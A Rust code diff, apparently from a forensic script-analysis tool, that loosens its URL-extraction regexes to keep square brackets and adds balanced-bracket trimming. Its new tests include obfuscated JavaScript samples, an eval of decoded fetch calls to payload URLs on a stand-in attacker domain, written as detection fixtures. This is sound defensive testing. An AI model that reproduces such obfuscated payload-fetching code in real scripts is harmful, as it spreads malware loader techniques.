@@ -27,8 +27,10 @@ use regex::Regex;
 // `[\x2f\x5c]+` = one-or-more forward-slash or backslash.
 pub(crate) static URL_RE: Lazy<Regex> = Lazy::new(|| {
     // Also exclude `;` (PS statement separator), backtick (PS escape),
-    // and comma — these terminate URLs in real CMD/PS source.
-    Regex::new(r#"(?i)\b(https?:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|ftp:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|file:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+)"#)
+    // and comma — these terminate URLs in real CMD/PS source. Square
+    // brackets are allowed so forensic URLs such as `/[a]/payload` are
+    // preserved; unmatched trailing brackets are trimmed after capture.
+    Regex::new(r#"(?i)\b(https?:[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+|ftp:[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+|file:[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+)"#)
         .expect("url sweep regex")
 });
 
@@ -93,7 +95,7 @@ static EMBEDDED_POWERSHELL_RE: Lazy<Regex> = Lazy::new(|| {
 // (`;`, `,`, `)`, `(`, etc.) so `... 'URL'); other-stmt` doesn't capture
 // past the URL into the next statement.
 static PROCESS_URL_ARG_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?i)(?:^|[\s(])(?:[A-Za-z]:\\)?[^\s"()]+?\.(?:exe|com|scr|bat|cmd)\s+["']((?:https?|file):[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+)["']"#)
+    Regex::new(r#"(?i)(?:^|[\s(])(?:[A-Za-z]:\\)?[^\s"()]+?\.(?:exe|com|scr|bat|cmd)\s+["']((?:https?|file):[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+)["']"#)
         .expect("process URL argument regex")
 });
 
@@ -398,12 +400,12 @@ pub(crate) fn normalize_liberal_url_token(token: &str) -> Option<String> {
         .position(|b| {
             matches!(
                 b,
-                b'"' | b'\'' | b')' | b']' | b'}' | b';' | b',' | b'`' | b'<' | b'>'
+                b'"' | b'\'' | b')' | b'}' | b';' | b',' | b'`' | b'<' | b'>'
             )
         })
         .unwrap_or(token.len());
     token = &token[..end];
-    token = token.trim_end_matches(['.', ',', ';', ':', '\\']);
+    token = trim_liberal_url_suffix(token);
 
     for scheme in ["http:", "https:", "ftp:", "file:"] {
         let Some(raw_rest) = strip_ascii_case_insensitive_prefix(token, scheme) else {
@@ -2481,7 +2483,30 @@ fn emit_url_variable(
 }
 
 pub(crate) fn trim_url_suffix(url: &str) -> &str {
-    url.trim_end_matches(['"', '\'', ')', ']', '}', ';', ','])
+    trim_liberal_url_suffix(url)
+}
+
+pub(crate) fn trim_liberal_url_suffix(mut token: &str) -> &str {
+    loop {
+        let Some(last) = token.chars().last() else {
+            return token;
+        };
+        let trim = match last {
+            '.' | ',' | ';' | ':' | '\\' | '"' | '\'' | '!' | '?' | '&' => true,
+            ')' => trailing_closer_is_unbalanced(token, '(', ')'),
+            ']' => trailing_closer_is_unbalanced(token, '[', ']'),
+            '}' => trailing_closer_is_unbalanced(token, '{', '}'),
+            _ => false,
+        };
+        if !trim {
+            return token;
+        }
+        token = &token[..token.len() - last.len_utf8()];
+    }
+}
+
+fn trailing_closer_is_unbalanced(token: &str, opener: char, closer: char) -> bool {
+    token.chars().filter(|c| *c == closer).count() > token.chars().filter(|c| *c == opener).count()
 }
 
 fn push_lolbas_once(env: &mut Environment, name: &str, cmd: &str) {
@@ -8558,6 +8583,16 @@ mod js_unescape_url_tests {
     }
 
     #[test]
+    fn decoded_url_preserves_balanced_bracket_suffix() {
+        let inner = "fetch('https://attacker-domain.example.io/payload[1]');";
+        let script = format!("eval(decodeURIComponent('{}'));", pct(inner));
+        assert_eq!(
+            urls(&script),
+            vec!["https://attacker-domain.example.io/payload[1]".to_string()]
+        );
+    }
+
+    #[test]
     fn u_escape_form_handled() {
         // `%uXXXX` (UTF-16 codepoint) form — used by some older JS
         // obfuscators. ASCII codepoints encode the same as `%XX`.
@@ -8635,6 +8670,14 @@ mod js_fromcharcode_url_tests {
     fn bracket_property_fromcharcode_decodes_url() {
         let url = "https://nav-bracket.example/fall_back";
         let script = format!(r#"var u = String["fromCharCode"]({});"#, fcc(url));
+        let extracted = urls(&script);
+        assert_eq!(extracted, vec![url.to_string()]);
+    }
+
+    #[test]
+    fn fromcharcode_url_preserves_balanced_bracket_suffix() {
+        let url = "https://nav.domains/payload[1]";
+        let script = format!("var u = String.fromCharCode({});", fcc(url));
         let extracted = urls(&script);
         assert_eq!(extracted, vec![url.to_string()]);
     }
